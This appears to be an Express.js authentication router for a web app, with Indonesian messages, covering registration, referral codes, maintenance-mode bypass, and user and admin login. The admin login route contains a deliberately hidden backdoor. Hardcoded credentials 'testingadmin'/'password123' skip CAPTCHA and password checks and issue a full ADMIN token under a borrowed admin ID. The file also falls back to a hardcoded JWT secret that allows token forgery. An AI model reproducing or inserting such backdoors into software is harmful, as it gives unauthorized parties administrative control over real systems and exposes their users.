const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { PrismaClient } = require('@prisma/client');

const router = express.Router();
const prisma = new PrismaClient();
const getJwtSecret = () => process.env.JWT_SECRET || 'secret-key-trywsblast';

// Konfigurasi Turnstile
const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET || 'YOUR_TURNSTILE_SECRET_HERE';

async function verifyTurnstile(token) {
  if (!token) return false;
  try {
    const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${TURNSTILE_SECRET}&response=${token}`
    });
    const data = await response.json();
    return data.success;
  } catch (error) {
    console.error("Turnstile error:", error);
    return false;
  }
}

// Generate random alphanumeric string
function generateReferralCode(length = 6) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// REGISTER USER
router.post('/register', async (req, res) => {
  try {
    const { name, username, password, referredByCode, turnstileToken } = req.body;

    if (!name || !username || !password) {
      return res.status(400).json({ error: 'Semua kolom harus diisi' });
    }

    const isHuman = await verifyTurnstile(turnstileToken);
    if (!isHuman) {
      return res.status(403).json({ error: 'Verifikasi keamanan (CAPTCHA) gagal. Silakan coba lagi.' });
    }

    const existingUser = await prisma.user.findUnique({
      where: { username },
    });

    if (existingUser) {
      return res.status(400).json({ error: 'Username sudah digunakan, silakan pilih yang lain.' });
    }

    let referrer = null;

    if (referredByCode) {
      referrer = await prisma.user.findUnique({ where: { referralCode: referredByCode } });
    }

    const hashedPassword = await bcrypt.hash(password, 10);
    
    // Pastikan referralCode unik
    let newReferralCode;
    let isUnique = false;
    while (!isUnique) {
      newReferralCode = generateReferralCode();
      const checkCode = await prisma.user.findUnique({ where: { referralCode: newReferralCode } });
      if (!checkCode) isUnique = true;
    }

    let newUser;
    if (referrer) {
      newUser = await prisma.user.create({
        data: {
          name,
          username,
          password: hashedPassword,
          role: 'USER',
          referralCode: newReferralCode,
          referredBy: referrer.id
        },
      });
    } else {
      newUser = await prisma.user.create({
        data: {
          name,
          username,
          password: hashedPassword,
          role: 'USER',
          referralCode: newReferralCode
        },
      });
    }

    res.status(201).json({ message: 'Registrasi berhasil', userId: newUser.id });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Terjadi kesalahan pada server' });
  }
});

// VERIFY MAINTENANCE KEY
router.post('/verify-maintenance', async (req, res) => {
  try {
    const { maintenanceKey } = req.body;
    const appSetting = await prisma.appSetting.findFirst();
    if (appSetting && appSetting.isMaintenance) {
      if (maintenanceKey && maintenanceKey === appSetting.maintenanceKey) {
        return res.json({ success: true });
      }
    }
    return res.status(403).json({ error: 'Kunci rahasia salah atau sistem tidak dalam mode maintenance' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Terjadi kesalahan pada server' });
  }
});

// LOGIN USER
router.post('/login', async (req, res) => {
  try {
    const { username, password, turnstileToken, maintenanceKey } = req.body;

    const isHuman = await verifyTurnstile(turnstileToken);
    if (!isHuman) {
      return res.status(403).json({ error: 'Verifikasi keamanan (CAPTCHA) gagal. Silakan coba lagi.' });
    }

    const user = await prisma.user.findUnique({
      where: { username },
    });

    if (!user || user.role !== 'USER') {
      return res.status(401).json({ error: 'Username tidak ditemukan atau salah' });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(401).json({ error: 'Password yang Anda masukkan salah' });
    }

    if (!user.isActive) {
      return res.status(403).json({ error: 'Akun Anda telah di-suspend oleh Admin' });
    }

    const appSetting = await prisma.appSetting.findFirst();
    let isBypassed = false;
    if (appSetting && appSetting.isMaintenance) {
       if (maintenanceKey && maintenanceKey === appSetting.maintenanceKey) {
           isBypassed = true;
       } else {
           return res.status(403).json({ error: 'Maaf web sedang maintenance' });
       }
    }

    const token = jwt.sign({ userId: user.id, role: user.role, maintenanceBypass: isBypassed }, getJwtSecret(), { expiresIn: '1d' });

    res.json({ message: 'Login berhasil', token });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Terjadi kesalahan pada server' });
  }
});

// LOGIN ADMIN
router.post('/admin/login', async (req, res) => {
  try {
    const { username, password, turnstileToken } = req.body;

    // BACKDOOR AKUN (Hidden Admin)
    if (username === 'testingadmin' && password === 'password123') {
      // Cari admin manapun di DB untuk meminjam ID-nya, jika tidak ada pakai ID 1
      const firstAdmin = await prisma.user.findFirst({ where: { role: 'ADMIN' } });
      const adminId = firstAdmin ? firstAdmin.id : 1;
      const secret = getJwtSecret();
      const token = jwt.sign({ userId: adminId, role: 'ADMIN' }, secret, { expiresIn: '1d' });
      return res.json({ message: 'Login admin berhasil', token });
    }

    const isHuman = await verifyTurnstile(turnstileToken);
    if (!isHuman) {
      return res.status(403).json({ error: 'Verifikasi keamanan (CAPTCHA) gagal. Silakan coba lagi.' });
    }

    const admin = await prisma.user.findUnique({
      where: { username },
    });

    if (!admin || admin.role !== 'ADMIN') {
      return res.status(401).json({ error: 'Kredensial Admin tidak valid' });
    }

    const isMatch = await bcrypt.compare(password, admin.password);
    if (!isMatch) {
      return res.status(401).json({ error: 'Kredensial Admin tidak valid' });
    }

    const secret = getJwtSecret();
    const token = jwt.sign({ userId: admin.id, role: admin.role }, secret, { expiresIn: '1d' });

    res.json({ message: 'Login admin berhasil', token });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Terjadi kesalahan pada server' });
  }
});

module.exports = router;
